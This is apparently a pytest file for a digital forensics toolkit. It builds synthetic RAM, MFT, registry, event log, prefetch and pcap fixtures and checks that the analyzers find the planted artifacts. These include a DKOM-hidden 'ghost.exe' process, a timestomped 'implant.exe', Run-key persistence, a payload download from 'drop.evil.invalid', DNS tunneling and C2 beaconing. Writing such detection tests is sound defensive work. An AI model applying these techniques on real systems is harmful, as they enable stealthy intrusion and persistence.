from __future__ import annotations

import json
from pathlib import Path
import socket
import struct

from aether_re.disk_registry_evtx import analyze_disk_registry_evtx
from aether_re.pcap_forensics import analyze_pcap_capture
from aether_re.ram_forensics import analyze_physical_ram_dump, translate_va_x64_pml4
from aether_re.supertimeline import build_supertimeline


_FILETIME_EPOCH_DIFF = 116444736000000000


def _iso_to_filetime(unix_ts: float) -> int:
    return int(unix_ts * 10_000_000) + _FILETIME_EPOCH_DIFF


def _build_minimal_pe_blob() -> bytes:
    buf = bytearray(0x600)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x8664, 1, 1730000000, 0, 0, 0xF0, 0x2022)
    struct.pack_into("<H", buf, 0x98, 0x020B)  # PE32+
    struct.pack_into("<I", buf, 0x98 + 56, 0x1000)  # SizeOfImage
    struct.pack_into("<I", buf, 0x98 + 60, 0x200)   # SizeOfHeaders
    sec_off = 0x98 + 0xF0
    buf[sec_off : sec_off + 8] = b".text\x00\x00\x00"
    struct.pack_into("<IIII", buf, sec_off + 8, 0x200, 0x1000, 0x200, 0x200)
    buf[0x200:0x204] = b"\x48\x31\xc0\xc3"
    return bytes(buf)


def _build_synthetic_ram_dump() -> tuple[bytes, int, int, int]:
    # Physical layout:
    # 0x1000: PML4, 0x2000: PDPT, 0x3000: PD, 0x4000: PT
    # 0x5000: injected RWX PE image (VA 0xFFFFF80000100000)
    # 0x6000: System EPROCESS (PA 0x6020 -> VA 0xFFFFF80000101020)
    # 0x7000: Hidden ghost.exe EPROCESS (PA 0x7020 -> unlinked DKOM)
    # 0x8000: inline JMP rel32 detour hook probe site
    ram = bytearray(0x10000)
    cr3 = 0x1000
    target_va = 0xFFFFF80000100000

    i4 = (target_va >> 39) & 0x1FF  # 496
    i3 = (target_va >> 30) & 0x1FF  # 0
    i2 = (target_va >> 21) & 0x1FF  # 0
    i1 = (target_va >> 12) & 0x1FF  # 256

    struct.pack_into("<Q", ram, 0x1000 + i4 * 8, 0x2000 | 0x3)
    struct.pack_into("<Q", ram, 0x2000 + i3 * 8, 0x3000 | 0x3)
    struct.pack_into("<Q", ram, 0x3000 + i2 * 8, 0x4000 | 0x3)
    # Map VA +0x0000 -> PA 0x5000 (RWX, NX=0) and VA +0x1000 -> PA 0x6000 (RW, NX=1)
    struct.pack_into("<Q", ram, 0x4000 + i1 * 8, 0x5000 | 0x3)
    struct.pack_into("<Q", ram, 0x4000 + (i1 + 1) * 8, 0x6000 | 0x3 | (1 << 63))

    pe = _build_minimal_pe_blob()
    ram[0x5000 : 0x5000 + len(pe)] = pe

    # Pool tag "Proc" at 0x6010 -> EPROCESS starts at 0x6010 + 0x0C = 0x601C? Let's align: tag at 0x6014, EPROCESS at 0x6020 (+0x0C)
    ram[0x6014:0x6018] = b"Proc"
    ep1 = 0x6020
    ram[ep1 : ep1 + 2] = b"\x03\x00"
    struct.pack_into("<Q", ram, ep1 + 0x028, cr3)
    struct.pack_into("<Q", ram, ep1 + 0x440, 4)
    head_va = 0xFFFFF80000101020 + 0x448
    struct.pack_into("<QQ", ram, ep1 + 0x448, head_va, head_va)  # single linked node
    struct.pack_into("<Q", ram, ep1 + 0x468, _iso_to_filetime(1730000100.0))
    ram[ep1 + 0x5A8 : ep1 + 0x5AE] = b"System"

    # Hidden DKOM EPROCESS at 0x7020 (NOT in ActiveProcessLinks chain starting at head_va)
    ram[0x7014:0x7018] = b"Proc"
    ep2 = 0x7020
    ram[ep2 : ep2 + 2] = b"\x03\x00"
    struct.pack_into("<Q", ram, ep2 + 0x028, 0x9000)
    struct.pack_into("<Q", ram, ep2 + 0x440, 31337)
    struct.pack_into("<QQ", ram, ep2 + 0x448, 0xFFFFF80000102468, 0xFFFFF80000102468)
    struct.pack_into("<Q", ram, ep2 + 0x468, _iso_to_filetime(1730000250.0))
    ram[ep2 + 0x5A8 : ep2 + 0x5B1] = b"ghost.exe"

    # Inline hook at 0x8000: JMP rel32
    ram[0x8000:0x8005] = b"\xe9\x10\x20\x00\x00"
    return bytes(ram), cr3, target_va, head_va


def _build_mft_fixture() -> bytes:
    mft = bytearray(2048)
    # Record 1 at offset 1024 with timestomped SI vs FN
    off = 1024
    mft[off : off + 4] = b"FILE"
    struct.pack_into("<HH", mft, off + 4, 48, 3)  # USA at 48, 3 entries
    struct.pack_into("<HH", mft, off + 0x14, 0x40, 0x01)  # first attr at 0x40, IN_USE

    # $STANDARD_INFORMATION (0x10) at +0x40, len 0x48 (72 bytes)
    si_pos = off + 0x40
    struct.pack_into("<II", mft, si_pos, 0x10, 0x48)
    mft[si_pos + 8] = 0
    struct.pack_into("<IH", mft, si_pos + 16, 48, 0x18)
    # Backdated year (~2021) with zeroed nanoseconds vs real FN (2024 with sub-seconds)
    si_ft = _iso_to_filetime(1610000000.0)
    struct.pack_into("<QQQQ", mft, si_pos + 0x18, si_ft, si_ft, si_ft, si_ft)

    # $FILE_NAME (0x30) at +0x88
    fn_pos = off + 0x88
    fname_u16 = "implant.exe".encode("utf-16le")
    c_len = 66 + len(fname_u16)
    attr_len = (0x18 + c_len + 7) & ~7
    struct.pack_into("<II", mft, fn_pos, 0x30, attr_len)
    mft[fn_pos + 8] = 0
    struct.pack_into("<IH", mft, fn_pos + 16, c_len, 0x18)
    fn_ft = _iso_to_filetime(1730000200.123456)
    struct.pack_into("<QQQQQ", mft, fn_pos + 0x18, 5, fn_ft, fn_ft, fn_ft, fn_ft)
    mft[fn_pos + 0x18 + 64] = len("implant.exe")
    mft[fn_pos + 0x18 + 65] = 1  # Win32
    mft[fn_pos + 0x18 + 66 : fn_pos + 0x18 + 66 + len(fname_u16)] = fname_u16
    struct.pack_into("<I", mft, fn_pos + attr_len, 0xFFFFFFFF)
    return bytes(mft)


def _build_registry_hive_fixture() -> bytes:
    hive = bytearray(0x2000)
    hive[0:4] = b"regf"
    root_rel = 0x20
    struct.pack_into("<I", hive, 0x24, root_rel)
    hive[0x1000:0x1004] = b"hbin"

    def write_cell(rel: int, payload: bytes) -> int:
        sz = (4 + len(payload) + 7) & ~7
        struct.pack_into("<i", hive, 0x1000 + rel, -sz)
        hive[0x1004 + rel : 0x1004 + rel + len(payload)] = payload
        return rel + sz

    # Root NK at 0x20 -> points to subkey list 'lh' at 0xB0 -> subkey Run at 0xE0 -> val list at 0x180 -> vk at 0x1A0 -> data at 0x1E0
    run_rel = 0xE0
    vlist_rel = 0x180
    vk_rel = 0x1A0
    data_rel = 0x1E0
    lh_rel = 0xB0

    # Root NK
    nk_root = bytearray(0x50)
    nk_root[0:2] = b"nk"
    struct.pack_into("<HQ", nk_root, 2, 0x20, _iso_to_filetime(1730000050.0))
    struct.pack_into("<I", nk_root, 0x14, 1)
    struct.pack_into("<I", nk_root, 0x1C, lh_rel)
    struct.pack_into("<II", nk_root, 0x24, 0, 0xFFFFFFFF)
    struct.pack_into("<HH", nk_root, 0x48, 4, 0)
    nk_root[0x4C:0x50] = b"ROOT"
    write_cell(root_rel, bytes(nk_root))

    # lh list
    lh = bytearray(12)
    lh[0:2] = b"lh"
    struct.pack_into("<HI", lh, 2, 1, run_rel)
    write_cell(lh_rel, bytes(lh))

    # Run NK
    nk_run = bytearray(0x4F)
    nk_run[0:2] = b"nk"
    struct.pack_into("<HQ", nk_run, 2, 0x20, _iso_to_filetime(1730000300.0))
    struct.pack_into("<II", nk_run, 0x14, 0, 0xFFFFFFFF)
    struct.pack_into("<II", nk_run, 0x24, 1, vlist_rel)
    struct.pack_into("<HH", nk_run, 0x48, 3, 0)
    nk_run[0x4C:0x4F] = b"Run"
    write_cell(run_rel, bytes(nk_run))

    # Value list + VK + Data
    write_cell(vlist_rel, struct.pack("<I", vk_rel))
    val_str = "C:\\Temp\\ghost.exe\x00".encode("utf-16le")
    write_cell(data_rel, val_str)

    vk = bytearray(20 + 7)
    vk[0:2] = b"vk"
    struct.pack_into("<HIIIH", vk, 2, 7, len(val_str), data_rel, 1, 0x1)
    vk[20:27] = b"Updater"
    write_cell(vk_rel, bytes(vk))
    return bytes(hive)


def _build_evtx_and_prefetch_fixtures() -> tuple[bytes, bytes]:
    evtx = bytearray(0x11000)
    evtx[0:8] = b"ElfFile\x00"
    evtx[0x1000:0x1008] = b"ElfChnk\x00"

    def add_ev_record(pos: int, rec_id: int, ts_unix: float, body_text: str) -> int:
        payload = body_text.encode("utf-16le")
        rec_sz = (28 + len(payload) + 7) & ~7
        evtx[pos : pos + 4] = b"\x2a\x2a\x00\x00"
        struct.pack_into("<IQQ", evtx, pos + 4, rec_sz, rec_id, _iso_to_filetime(ts_unix))
        evtx[pos + 24 : pos + 24 + len(payload)] = payload
        return pos + rec_sz

    p = add_ev_record(0x1200, 101, 1730000310.0, "<Event><System><EventID>7045</EventID><Channel>System</Channel></System></Event>")
    add_ev_record(p, 102, 1730000400.0, "<Event><System><EventID>1102</EventID><Channel>Security</Channel></System></Event>")

    pf = bytearray(0x100)
    struct.pack_into("<I", pf, 0, 30)
    pf[4:8] = b"SCCA"
    pf[16 : 16 + 20] = "GHOST.EXE\x00".encode("utf-16le")
    struct.pack_into("<I", pf, 76, 0xDEADBEEF)
    struct.pack_into("<Q", pf, 0x80, _iso_to_filetime(1730000260.0))
    struct.pack_into("<I", pf, 0xD0, 3)
    return bytes(evtx), bytes(pf)


def _wrap_eth_ipv4(proto: int, src: str, dst: str, l4: bytes) -> bytes:
    eth = b"\xaa\xbb\xcc\xdd\xee\xff\x11\x22\x33\x44\x55\x66\x08\x00"
    tot = 20 + len(l4)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, 1, 0, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return eth + ip + l4


def _build_pcap_fixture() -> bytes:
    pkts: list[tuple[float, bytes]] = []

    # 1. DNS Tunneling UDP packet
    labels = b"".join(bytes([len(p)]) + p for p in (b"MZXW6YTBOJRGC3TFOJUXG5DSN5SA433P", b"c2", b"tunnel", b"org")) + b"\x00"
    dns_hdr = struct.pack("!HHHHHH", 0x1337, 0x0100, 1, 0, 0, 0) + labels + struct.pack("!HH", 16, 1)
    udp = struct.pack("!HHHH", 54321, 53, 8 + len(dns_hdr), 0) + dns_hdr
    pkts.append((1730000150.5, _wrap_eth_ipv4(17, "10.0.0.5", "8.8.8.8", udp)))

    # 2. TLS ClientHello with SNI=c2.evil.invalid
    sni_host = b"c2.evil.invalid"
    sni_ext_data = struct.pack("!HBH", 3 + len(sni_host), 0, len(sni_host)) + sni_host
    ext0 = struct.pack("!HH", 0, len(sni_ext_data)) + sni_ext_data
    ext10 = struct.pack("!HHHH", 10, 4, 2, 0x001D)
    exts = ext0 + ext10
    # Build exact ClientHello body cleanly:
    ch = bytearray()
    ch += struct.pack("!H", 0x0303) + b"\x01" * 32 + b"\x00"
    ch += struct.pack("!HHH", 4, 0x1301, 0x1302)
    ch += b"\x01\x00"
    ch += struct.pack("!H", len(exts)) + exts
    hs = struct.pack("!BBH", 1, 0, len(ch)) + ch
    tls_rec = struct.pack("!BHH", 0x16, 0x0301, len(hs)) + hs
    tcp_tls = struct.pack("!HHIIHHHH", 50001, 443, 1, 0, (5 << 12) | 0x18, 65535, 0, 0) + tls_rec
    pkts.append((1730000160.0, _wrap_eth_ipv4(6, "10.0.0.5", "198.51.100.10", tcp_tls)))

    # 3. HTTP GET + MZ download stream
    http_req = b"GET /payload.exe HTTP/1.1\r\nHost: drop.evil.invalid\r\n\r\n"
    tcp_http = struct.pack("!HHIIHHHH", 50002, 80, 1, 0, (5 << 12) | 0x18, 65535, 0, 0) + http_req
    pkts.append((1730000165.0, _wrap_eth_ipv4(6, "10.0.0.5", "198.51.100.10", tcp_http)))
    http_resp = b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\nMZ\x90\x00" + b"A" * 60
    tcp_resp = struct.pack("!HHIIHHHH", 80, 50002, 1, 0, (5 << 12) | 0x18, 65535, 0, 0) + http_resp
    pkts.append((1730000166.0, _wrap_eth_ipv4(6, "198.51.100.10", "10.0.0.5", tcp_resp)))

    # 4. Periodic C2 SYN beaconing every 10.0s (5 beacons)
    for k in range(5):
        tcp_syn = struct.pack("!HHIIHHHH", 51000 + k, 8443, 100, 0, (5 << 12) | 0x02, 65535, 0, 0)
        pkts.append((1730000200.0 + k * 10.0, _wrap_eth_ipv4(6, "10.0.0.5", "203.0.113.99", tcp_syn)))

    out = bytearray(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    for ts, frame in pkts:
        sec = int(ts)
        usec = int((ts - sec) * 1_000_000)
        out += struct.pack("<IIII", sec, usec, len(frame), len(frame)) + frame
    return bytes(out)


def test_v115_ram_pml4_dkom_and_injected_pe_carve(tmp_path: Path) -> None:
    ram, cr3, target_va, head_va = _build_synthetic_ram_dump()
    tr = translate_va_x64_pml4(ram, cr3, target_va)
    assert tr["mapped"] is True
    assert tr["pa"] == "0x5000"
    assert tr["rwx"] is True

    rep = analyze_physical_ram_dump(
        ram,
        output_dir=tmp_path,
        cr3=cr3,
        active_links_head_va=head_va,
        hook_check_offsets=[0x8000],
    )
    assert rep["rwx_page_count"] >= 1
    assert rep["active_process_count"] == 1
    assert rep["dkom_hidden_count"] == 1
    assert rep["dkom_hidden_processes"][0]["name"] == "ghost.exe"
    assert rep["dkom_hidden_processes"][0]["pid"] == 31337
    assert rep["carved_pe_count"] >= 1
    assert rep["carved_pes"][0]["in_rwx_page"] is True
    assert Path(rep["carved_pes"][0]["carved_path"]).is_file()
    assert rep["inline_hooks"][0]["pattern"] == "JMP_REL32"


def test_v115_disk_mft_timestomp_registry_evtx_prefetch() -> None:
    mft = _build_mft_fixture()
    reg = _build_registry_hive_fixture()
    evtx, pf = _build_evtx_and_prefetch_fixtures()

    rep = analyze_disk_registry_evtx(
        mft_bytes=mft,
        registry_hive_bytes=reg,
        evtx_bytes=evtx,
        prefetch_blobs=[pf],
    )
    assert rep["mft"]["timestomp_count"] == 1
    ts_entry = rep["mft"]["timestomped_entries"][0]
    assert ts_entry["filename"] == "implant.exe"
    assert "SI_CREATED_BEFORE_FN_CREATED" in ts_entry["timestomp_reasons"]
    assert "SI_NANOSECONDS_ZEROED" in ts_entry["timestomp_reasons"]

    assert rep["registry"]["valid"] is True
    assert len(rep["registry"]["persistence_hits"]) == 1
    assert rep["registry"]["persistence_hits"][0]["values"][0]["value"].startswith("C:\\Temp\\ghost.exe")

    assert rep["evtx"]["valid"] is True
    eids = {e["event_id"] for e in rep["evtx"]["events"]}
    assert {7045, 1102}.issubset(eids)

    assert len(rep["prefetch"]) == 1
    assert rep["prefetch"][0]["executable"] == "GHOST.EXE"
    assert rep["prefetch"][0]["run_count"] == 3


def test_v115_pcap_dns_tunnel_ja3_http_and_beacon() -> None:
    pcap = _build_pcap_fixture()
    rep = analyze_pcap_capture(pcap)
    assert rep["format"] == "pcap"
    assert len(rep["dns_tunneling_hits"]) == 1
    assert rep["tls_ja3_hellos"][0]["sni"] == "c2.evil.invalid"
    assert len(rep["tls_ja3_hellos"][0]["ja3_md5"]) == 32
    assert rep["http_events"][0]["uri"] == "/payload.exe"
    assert rep["carved_payloads"][0]["type"] == "PE_MZ"
    assert len(rep["c2_beacons"]) == 1
    assert rep["c2_beacons"][0]["beacon_count"] == 5
    assert rep["c2_beacons"][0]["jitter_cv"] == 0.0


def test_v115_supertimeline_correlation_and_plaso_export(tmp_path: Path) -> None:
    ram, cr3, _, head_va = _build_synthetic_ram_dump()
    ram_rep = analyze_physical_ram_dump(ram, output_dir=tmp_path, cr3=cr3, active_links_head_va=head_va)
    evtx, pf = _build_evtx_and_prefetch_fixtures()
    disk_rep = analyze_disk_registry_evtx(
        mft_bytes=_build_mft_fixture(),
        registry_hive_bytes=_build_registry_hive_fixture(),
        evtx_bytes=evtx,
        prefetch_blobs=[pf],
    )
    pcap_rep = analyze_pcap_capture(_build_pcap_fixture())

    tl = build_supertimeline(
        ram_report=ram_rep,
        disk_report=disk_rep,
        pcap_report=pcap_rep,
        output_dir=tmp_path / "timeline",
    )
    assert tl["event_count"] >= 8
    timestamps = [e["timestamp_utc"] for e in tl["events"]]
    assert timestamps == sorted(timestamps)
    assert {"Defense Evasion", "Persistence", "Command and Control"}.issubset(set(tl["mitre_tactics_observed"]))
    jsonl_p = Path(tl["files_written"]["jsonl"])
    csv_p = Path(tl["files_written"]["csv"])
    assert jsonl_p.is_file() and jsonl_p.stat().st_size > 100
    assert csv_p.is_file() and csv_p.stat().st_size > 100
    first_row = json.loads(jsonl_p.read_text(encoding="utf-8").splitlines()[0])
    assert "timestamp_utc" in first_row and "source" in first_row
